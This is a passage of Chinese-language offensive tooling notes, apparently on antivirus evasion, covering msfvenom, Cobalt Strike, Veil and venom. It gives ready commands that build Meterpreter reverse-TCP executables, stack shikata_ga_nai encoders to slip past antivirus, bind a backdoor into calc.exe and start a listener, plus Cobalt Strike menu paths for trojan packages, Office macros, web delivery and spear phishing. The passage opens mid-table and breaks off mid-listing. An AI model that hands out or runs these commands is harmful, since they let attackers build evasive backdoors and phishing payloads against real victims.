| staging(msf)    | GetTickCount                           | √          | √            | ×             | ×               | ×             | ×               | ×              | ×                |
| staging(msf)    | GlobalMemoryStatusEx     GetSystemInfo | ×          | ×            | ×             | ×               | ×             | ×               | ×              | ×                |
## 0x03 部分工具使用方法
### 1 Msfvenom
```shell
基本选项：
	-l, --list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
	-a, --arch  指定payload的目标架构
	-p, --platform  指定payload的目标平台
	-s, --space  设定有效攻击荷载的最大长度
	-n, --nopsled  为payload预先指定一个NOP滑动长度
	-b, --bad-chars  设定规避字符集，比如: '\x00'、‘\xff'
	-e, --encoder [encoder] 指定需要使用的encoder（编码器）
	-i, --iterations  指定payload的编码次数
	-x, --template  指定一个自定义的可执行文件作为模板
	-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行
	-c, --add-code  指定一个附加的win32 shellcode文件
	-h, --help 查看帮助选项
	--help-formats 查看msf支持的输出格式列表
	-f, --format  指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
	--payload-options 列举payload的标准选项
```
```shell
msfconsole -x "use exploit/multi/handler;\set PAYLOAD windows/meterpreter/reverse_tcp;\set LHOST ${c2_ip};\set LPORT $c2_port;\exploit"
#裸马生成
msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=${c2_ip} LPORT=${c2_port} -o shell.exe
#单次编码
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=${c2_ip} LPORT=${c2_port} -i 3 -e x86/shikata_ga_nai -f exe -o shell.exe
#多次编码-1
msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=${c2_ip} LPORT=${c2_port} -e x86/shikata_ga_nai -i 5 |msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw |msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -b '\x00' -o payload.exe
#多次编码-2
msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -b '\x00' -f exe -o cmd.exe
#文件捆绑
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -x calc.exe -k -f exe -o shell.exe
```
### 2 CobaltStrike
```shell
#传一份cs到linux
chmod +x teamserver;
./teamserver   [/path/to/c2.profile] [YYYY-MM-DD]
#本地登录到teamserver后，先配置listener:
ColbaltStrike>Listeners>Add ===> cs4有8种listener 及 cs3.x有9种listener
#再生成木马
Attacks>Packages>Windows Execuation=>2种exe2种dll
```
```cmd
#木马生成(CobaltStrike-Attacks)
### 可执行文件
Attacks>Packages>Windows Executable
./teamserver 192.168.44.128 bloodhound
### HTML程序
Attacks>Packages>HTML Application
### Office宏
Attacks>Packages>Micosoft Office Macro
### Payload Generator
Attacks>Packages>Payload Generator
### 简易恶意网站（常用于无文件攻击），powershell/bitsadmin/regsvr32/python
Attacks>Web Drive-by>Scripted Web Delivery
### 鱼叉式网络Spear Phish
```
### 3 veil
```shell
curl -sSL https://get.daocloud.io/docker | sh
nano /etc/docker/daemon.json
>>>
{
 "registry-mirrors": [
 "https://1nj0zren.mirror.aliyuncs.com",
 "https://docker.mirrors.ustc.edu.cn",
 "http://f1361db2.m.daocloud.io",
 "https://registry.docker-cn.com"
 ]
}
: list
        1)      autoit/shellcode_inject/flat.py
        2)      auxiliary/coldwar_wrapper.py
        3)      auxiliary/macro_converter.py
        4)      auxiliary/pyinstaller_wrapper.py
        5)      c/meterpreter/rev_http.py
        6)      c/meterpreter/rev_http_service.py
        7)      c/meterpreter/rev_tcp.py
        8)      c/meterpreter/rev_tcp_service.py
        9)      cs/meterpreter/rev_http.py
        10)     cs/meterpreter/rev_https.py
        11)     cs/meterpreter/rev_tcp.py
        12)     cs/shellcode_inject/base64.py
        13)     cs/shellcode_inject/virtual.py
        14)     go/meterpreter/rev_http.py
        15)     go/meterpreter/rev_https.py
        16)     go/meterpreter/rev_tcp.py
        17)     go/shellcode_inject/virtual.py
        18)     lua/shellcode_inject/flat.py
        19)     perl/shellcode_inject/flat.py
        20)     powershell/meterpreter/rev_http.py
        21)     powershell/meterpreter/rev_https.py
        22)     powershell/meterpreter/rev_tcp.py
        23)     powershell/shellcode_inject/psexec_virtual.py
        24)     powershell/shellcode_inject/virtual.py
        25)     python/meterpreter/bind_tcp.py
        26)     python/meterpreter/rev_http.py
        27)     python/meterpreter/rev_https.py
        28)     python/meterpreter/rev_tcp.py
        29)     python/shellcode_inject/aes_encrypt.py
        30)     python/shellcode_inject/arc_encrypt.py
        31)     python/shellcode_inject/base64_substitution.py
        32)     python/shellcode_inject/des_encrypt.py
        33)     python/shellcode_inject/flat.py
        34)     python/shellcode_inject/letter_substitution.py
        35)     python/shellcode_inject/pidinject.py
        36)     python/shellcode_inject/stallion.py
        37)     ruby/meterpreter/rev_http.py
        38)     ruby/meterpreter/rev_https.py
        39)     ruby/meterpreter/rev_tcp.py
        40)     ruby/shellcode_inject/base64.py
        41)     ruby/shellcode_inject/flat.py
```
**3.2 Ordnance**
**3.2.1 payload**
veil内置6种原生的payload
-------------------------------------------------------------------------------
```shell
Veil/Ordnance>: list payloads
    1)      bind_tcp          => Bind TCP Stager (Stage 1)
    2)      rev_http          => Reverse HTTP Stager (Stage 1)
    3)      rev_https         => Reverse HTTPS Stager (Stage 1)
    4)      rev_tcp           => Reverse TCP Stager (Stage 1)
    5)      rev_tcp_all_ports => Reverse TCP All Ports Stager (Stage 1)
    6)      rev_tcp_dns       => Reverse TCP DNS Stager (Stage 1)
```
**3.2.2 encoder**
veil使用xor编码器对shellcode进行转换
### 4 venom
```shell
#安装
git clone https://github.com/r00t-3xp10it/venom.git
cd venom/aux && ./setup.sh; cd ..
./venom.sh
```
```shell
[➽] Chose Categorie number:2 - Windows-OS payloads
AGENT Nº1:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : C (uuid obfuscation)
    AGENT EXTENSION    : DLL|CPL
    AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)
    DETECTION RATIO    : http://goo.gl/NkVLzj
    AGENT Nº2:
    ──────────
    TARGET SYSTEMS     : Windows
    SHELLCODE FORMAT   : DLL
    AGENT EXTENSION    : DLL|CPL
    AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)
    DETECTION RATIO    : http://goo.gl/dBGd4x